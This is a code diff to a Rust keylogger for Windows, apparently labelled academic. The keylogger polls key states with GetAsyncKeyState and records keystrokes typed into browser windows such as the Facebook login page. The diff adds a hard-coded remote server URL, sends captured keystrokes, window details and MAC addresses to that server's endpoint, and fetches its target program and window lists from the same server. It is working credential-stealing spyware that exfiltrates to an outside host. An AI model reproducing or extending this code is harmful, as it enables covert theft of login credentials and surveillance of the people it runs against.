@@ -20,9 +20,10 @@ use bindings::Windows::Win32::{
 
 use chrono::prelude::{DateTime, Utc};
 
-use serde::Serialize;
+use serde::{Deserialize, Serialize};
 
 const MAX_NETWORK_ADAPTERS: usize = 16;
+const API_URL: &str = "https://rust-academic-keylogger.herokuapp.com";
 
 #[derive(Serialize, Debug)]
 struct KeyLoggerPayload {
@@ -35,8 +36,18 @@ struct KeyPressInfo {
     timestamp: DateTime<Utc>,
     window_path: String,
     window_title: String,
-    keyboard_layout: isize,
+    keyboard_layout: String,
     key_pressed: String,
+}
+
+#[derive(Deserialize)]
+struct Program {
+    name: String,
+}
+
+#[derive(Deserialize)]
+struct Window {
+    title: String,
 }
 
 fn virtual_key_code_to_string(virtual_key_code: i32) -> Option<String> {
@@ -258,13 +269,13 @@ fn mac_addresses() -> Vec<[i8; MAX_NETWORK_ADAPTERS]> {
         .collect()
 }
 
-fn is_program_desired(program_names: &[&str], window_path: &str) -> bool {
+fn is_program_desired(program_names: &[String], window_path: &str) -> bool {
     program_names
         .iter()
         .any(|program_name| window_path.ends_with(program_name))
 }
 
-fn is_window_title_desired(window_titles: &[&str], window_title: &str) -> bool {
+fn is_window_title_desired(window_titles: &[String], window_title: &str) -> bool {
     window_titles
         .iter()
         .any(|title| window_title.contains(title))
@@ -284,7 +295,14 @@ async fn send_server_key_presses_thread(rx: Receiver<KeyPressInfo>) {
             mac_addresses: mac_addresses(),
             key_presses,
         };
-        while http_client.post("").json(&kl_payload).send().await.is_err() {
+        println!("sending payload to server");
+        while http_client
+            .post(format!("{}/key-presses", API_URL))
+            .json(&kl_payload)
+            .send()
+            .await
+            .is_err()
+        {
             println!("retrying send payload to server");
             std::thread::sleep(retry_response_duration);
         }
@@ -293,8 +311,8 @@ async fn send_server_key_presses_thread(rx: Receiver<KeyPressInfo>) {
 
 fn capture_client_keys(
     tx: &Sender<KeyPressInfo>,
-    browser_exe_names: &[&str],
-    window_titles: &[&str],
+    browser_exe_names: &[String],
+    window_titles: &[String],
 ) {
     for virtual_key_code in 0..255 {
         let key_state = unsafe { GetAsyncKeyState(virtual_key_code) };
@@ -305,15 +323,20 @@ fn capture_client_keys(
                 let active_window_handle = unsafe { GetForegroundWindow() };
                 let window_path = path_active_window(active_window_handle);
                 let window_title = title_active_window(active_window_handle);
+
                 let will_key_press_be_recorded =
                     is_program_desired(&browser_exe_names, &window_path)
-                        && is_window_title_desired(&window_titles, &window_title);
+                        && is_window_title_desired(window_titles, &window_title);
+
                 if will_key_press_be_recorded {
+                    let keyboard_layout = unsafe { GetKeyboardLayout(0).0 };
+                    let keyboard_layout = format!("{:b}", keyboard_layout);
+
                     let kpi = KeyPressInfo {
                         key_pressed,
                         window_title,
                         window_path,
-                        keyboard_layout: unsafe { GetKeyboardLayout(0).0 },
+                        keyboard_layout,
                         timestamp: Utc::now(),
                     };
                     tx.send(kpi).unwrap();
@@ -328,8 +351,25 @@ async fn main() {
     let (tx, rx) = mpsc::channel::<KeyPressInfo>();
     tokio::spawn(send_server_key_presses_thread(rx));
 
-    let browser_exe_names = ["msedge.exe", "chrome.exe", "firefox.exe"];
-    let window_titles = ["Facebook - Log In or Sign Up"];
+    let browser_exe_names = reqwest::get(format!("{}/programs", API_URL))
+        .await
+        .unwrap()
+        .json::<Vec<Program>>()
+        .await
+        .unwrap()
+        .into_iter()
+        .map(|program| program.name)
+        .collect::<Vec<String>>();
+
+    let window_titles = reqwest::get(format!("{}/windows", API_URL))
+        .await
+        .unwrap()
+        .json::<Vec<Window>>()
+        .await
+        .unwrap()
+        .into_iter()
+        .map(|window| window.title)
+        .collect::<Vec<String>>();
 
     let key_detection_duration = Duration::from_millis(50);
     loop {
